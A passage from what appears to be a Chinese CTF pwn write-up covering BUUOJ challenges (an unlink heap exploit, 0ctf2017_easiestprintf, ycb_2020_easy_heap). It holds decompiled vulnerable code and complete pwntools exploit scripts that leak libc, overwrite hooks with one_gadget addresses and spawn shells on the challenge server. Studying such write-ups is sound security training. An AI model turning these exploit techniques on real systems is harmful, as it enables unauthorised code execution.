class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = unk_203010;</span><br><span class="line">  <span class="keyword">if</span> ( unk_203010 )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\nIf you don't know what to test, here are some strings to choose from."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Do you want to use one?(Y/N)"</span>);</span><br><span class="line">    v3 = getchar();</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">'Y'</span> )</span><br><span class="line">    {</span><br><span class="line">      unk_203010 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Here are 5 strings to be tested. Which one do you want to test?"</span>);</span><br><span class="line">      num = (<span class="type">int</span>)abs32(read_input()) % <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">if</span> ( num &gt; <span class="number">4</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"It seems that you don't want to use these strings."</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"The string:"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)heap_ptr[num + <span class="number">4</span>]);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Bye~"</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>还有一个漏洞点在上面<code>(int)abs32(read_input()) % 5;</code>int型0x80000000进行abs32运算之后还是0x80000000，但是会变成负的，这个结果%5=-3，所以在下面的puts中-3 + 4 = 1，所以puts(heap_ptr[1])，这个heap_ptr[1]是什么呢</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_BCB</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  heap_ptr[<span class="number">0</span>] = &amp;unk_2030C0;</span><br><span class="line">  heap_ptr[<span class="number">1</span>] = heap_ptr;</span><br><span class="line">  result = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  fd = result;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    heap_ptr[i + <span class="number">4</span>] = <span class="built_in">calloc</span>(<span class="number">0x20</span>uLL, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    {</span><br><span class="line">      unk_203040 = heap_ptr[i + <span class="number">4</span>];</span><br><span class="line">      qword_203160 = unk_203040 + <span class="number">1520LL</span>;</span><br><span class="line">      v2 = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    result = read(fd, heap_ptr[i + <span class="number">4</span>], <span class="number">0x20</span>uLL);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>其实在第一个函数中已经写过了，heap_ptr[1] = heap_ptr， 那就会输出这个地址，有了这个地址之后就可以算出程序基址</p>
<p>有了code_base并且可以堆溢出，其实攻击思路有很多种，这里选择unlink，中edit的时候发现会卡住，只需要在edit中间加个\n就可以过了，\x00的edit是最简单的，所以有很多地方明明可以直接edit去任意地址修改，但还是会换成有\x00的地址</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./one'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">28806</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'command&gt;&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Now, you can input your test string:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Please give me the index of the string:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, want, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Please give me the index of the string:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">'Which char do you want to edit:'</span>, want)</span><br><span class="line">    r.sendlineafter(<span class="string">'What do you want to edit it into:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Please give me the index of the string:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">'12580'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Do you want to use one?(Y/N)'</span>, <span class="string">'Y'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Here are 5 strings to be tested. Which one do you want to test?\n'</span>, <span class="built_in">str</span>(<span class="number">0x80000000</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'The string:\n'</span>)</span><br><span class="line">heap_ptr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'heap_ptr = '</span> + <span class="built_in">hex</span>(heap_ptr))</span><br><span class="line"></span><br><span class="line">code_base = heap_ptr - <span class="number">0x2030c0</span></span><br><span class="line">li(<span class="string">'code_base = '</span> + <span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    p1 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">'A'</span>) + i)</span><br><span class="line"></span><br><span class="line">add(p1)</span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">'\x00'</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">'\x00'</span>, <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">'b'</span>) + i))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'\x00'</span>, <span class="string">'\x04'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A\n'</span>, <span class="string">'\x44'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A\n'</span>, <span class="string">'\x40'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'\x44\n'</span>, <span class="string">'\x41'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">'i'</span>) - i) + <span class="string">'\n'</span>, <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'b\n'</span>, <span class="string">'\x30'</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">fake_chunk += p64(heap_ptr - <span class="number">0x18</span>) + p64(heap_ptr - <span class="number">0x10</span>)</span><br><span class="line">fake_chunk = fake_chunk[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1f</span>):</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">'`'</span>) - i) + <span class="string">'\n'</span>, <span class="built_in">chr</span>(fake_chunk[i]))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A\n'</span>, <span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xF</span> + <span class="number">1</span>):</span><br><span class="line">    add(<span class="string">'c'</span> * <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">'\x00'</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'\xa8\n'</span>, <span class="string">'\xc8'</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>] + code_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">'\x00'</span>, p8((free_got &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xFF</span>))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'free_addr = '</span> + <span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    edit(<span class="number">0</span>, p8((free_got &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xFF</span>) + <span class="string">b'\n'</span>, p8((free_hook &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xFF</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">'\x00'</span>, p8((one_gadget &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xFF</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0ctf2017-easiestprintf"><a href="#0ctf2017-easiestprintf" class="headerlink" title="0ctf2017_easiestprintf"></a>0ctf2017_easiestprintf</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">do_read</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  _DWORD *v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which address you wanna read:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%u"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%#x\n"</span>, *v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>do_read可以泄露出libc</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">leave</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-B0h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">160</span>]; <span class="comment">// [esp+Ch] [ebp-ACh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Good Bye"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">158</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;s[i], <span class="number">1u</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( s[i] == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里有格式化，但是保护了got表，不能利用exit_got，这里有一个点就是printf输出的字符过多的时候，会调用malloc来处理</p>
<p>如果控制了malloc_hook为ogg就可以getshell了，具体的看源码</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (width &gt;= WORK_BUFFER_SIZE - <span class="number">32</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* We have to use a special buffer.  The "32" is just a safe</span></span><br><span class="line"><span class="comment">     bet for all the output which is not counted in the width.  */</span></span><br><span class="line">  <span class="type">size_t</span> needed = ((<span class="type">size_t</span>) width + <span class="number">32</span>) * <span class="keyword">sizeof</span> (CHAR_T);</span><br><span class="line">  <span class="keyword">if</span> (__libc_use_alloca (needed))</span><br><span class="line">    workend = (CHAR_T *) alloca (needed) + width + <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      workstart = (CHAR_T *) <span class="built_in">malloc</span> (needed);</span><br><span class="line">      <span class="keyword">if</span> (workstart == <span class="literal">NULL</span>)</span><br><span class="line">	{</span><br><span class="line">	  done = <span class="number">-1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> all_done;</span><br><span class="line">	}</span><br><span class="line">      workend = workstart + width + <span class="number">32</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">inline</span> <span class="type">int</span> __libc_use_alloca (<span class="type">size_t</span> size)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">return</span> size &lt;= __MAX_ALLOCA_CUTOFF;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>needed要大于<code>__MAX_ALLOCA_CUTOFF</code>，然后就可以到下面的malloc了，所以先利用fmt改<code>malloc_hook</code>，然后在后面加%99999999c，肯定比<code>__MAX_ALLOCA_CUTOFF</code>大，所以就可以成功调用malloc了</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./EasiestPrintf'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27051</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">r.sendlineafter(<span class="string">'Which address you wanna read:'</span>, <span class="built_in">str</span>(puts_got))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = <span class="built_in">int</span>(r.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'puts_addr = '</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#one = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]</span></span><br><span class="line"><span class="comment">#one = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x3ac9c, 0x3ac9d, 0x5fbd5, 0x5fbd6]</span></span><br><span class="line">one = [<span class="number">0x3a80c</span>, <span class="number">0x3a80e</span>, <span class="number">0x3a812</span>, <span class="number">0x3a819</span>, <span class="number">0x5f065</span>, <span class="number">0x5f066</span>]</span><br><span class="line">one_gadget = one[<span class="number">2</span>] + libc_base</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">offest = <span class="number">7</span></span><br><span class="line">p1 = fmtstr_payload(offest, {malloc_hook : one_gadget}) + <span class="string">b"%99999999c"</span></span><br><span class="line">r.sendlineafter(<span class="string">'Good Bye\n'</span>, p1)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="ycb-2020-easy-heap"><a href="#ycb-2020-easy-heap" class="headerlink" title="ycb_2020_easy_heap"></a>ycb_2020_easy_heap</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">edit</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">{</span><br><span class="line">  _BYTE *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  index = read_input(<span class="string">"Index: "</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xFF</span> || !heap_ptr[index] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Don not exist!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  v2 = heap_ptr[index];</span><br><span class="line">  v2[(<span class="type">int</span>)read(<span class="number">0</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)size_ptr[index])] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"[+]Done!"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>edit这里有一个off-by-null，这一题就是2.31的off-by-null，板子题，之前没做过2.31的off-by-null，直接拿的网上的板子一套，然后orw即可</p>
<p>这里学到了一个execveat拿shell，使用bash的一些内置命令即可</p>
